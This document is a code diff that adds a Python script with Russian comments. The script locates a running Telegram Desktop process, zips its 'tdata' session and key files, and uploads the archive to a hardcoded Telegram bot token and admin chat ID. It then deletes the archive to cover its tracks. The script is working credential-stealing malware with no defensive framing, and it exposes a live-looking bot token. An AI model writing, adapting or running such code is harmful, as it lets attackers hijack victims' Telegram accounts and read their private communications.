@@ -1,0 +1,93 @@
+import psutil
+import os
+import zipfile
+import datetime
+import requests  # Import the requests library
+from requests.exceptions import RequestException
+
+BOT_TOKEN = "8174737942:AAEgCP12-jJ5ux9URaOoN3nFawHIakyEXDY"  
+ADMIN_ID = "6761011723"
+TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
+
+def find_telegram_directory():
+    for proc in psutil.process_iter(['pid', 'name', 'exe']):
+        try:
+            if proc.name().lower() == 'telegram.exe':
+                return os.path.dirname(proc.exe())
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            pass
+    return None
+
+def create_archive(telegram_dir):
+    tdata_dir = os.path.join(telegram_dir, 'tdata')
+    if not os.path.exists(tdata_dir):
+        return None
+
+    archive_name = f"telegram_data_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
+    archive_path = os.path.join(telegram_dir, archive_name)
+
+    try:
+        with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            # Добавляем key_datas
+            key_datas_path = os.path.join(tdata_dir, 'D877F783D5D3EF8Cs')
+            if os.path.exists(key_datas_path):
+                zipf.write(key_datas_path, 'D877F783D5D3EF8Cs')
+            else:
+                return False
+            key_datas2_path = os.path.join(tdata_dir, 'key_datas')
+            if os.path.exists(key_datas2_path):
+                zipf.write(key_datas2_path, 'key_datas')
+            else:
+                return False
+            for item in os.listdir(tdata_dir):
+                if item.startswith('D8'):
+                    item_path = os.path.join(tdata_dir, item)
+                    if os.path.isfile(item_path):
+                        zipf.write(item_path, item)
+                    elif os.path.isdir(item_path):
+                        for root, _, files in os.walk(item_path):
+                            for file in files:
+                                file_path = os.path.join(root, file)
+                                archive_path_in_zip = os.path.join(item, os.path.relpath(file_path, item_path)) #Сохраняем структуру папок
+                                zipf.write(file_path, archive_path_in_zip)
+                    break
+        return archive_path
+
+    except Exception as e:
+        return None
+
+
+def send_archive_to_bot_requests(archive_path):
+    if not archive_path:
+        return False
+
+    try:
+        with open(archive_path, 'rb') as archive_file:
+            files = {'document': archive_file}
+            data = {'chat_id': ADMIN_ID}
+            response = requests.post(f"{TELEGRAM_API_URL}/sendDocument", data=data, files=files)
+            response.raise_for_status()  # Raise HTTPError for bad responses (4xx or 5xx)
+
+        # Удаляем архив после отправки
+        os.remove(archive_path)
+        return True
+
+    except FileNotFoundError:
+        return False
+    except RequestException:
+        return False
+    except Exception:
+        return False
+
+
+if __name__ == '__main__':
+    telegram_directory = find_telegram_directory()
+
+    if telegram_directory:
+        archive_path = create_archive(telegram_directory)
+        if archive_path:
+            send_archive_to_bot_requests(archive_path)
+        else:
+            pass
+    else:
+        pass
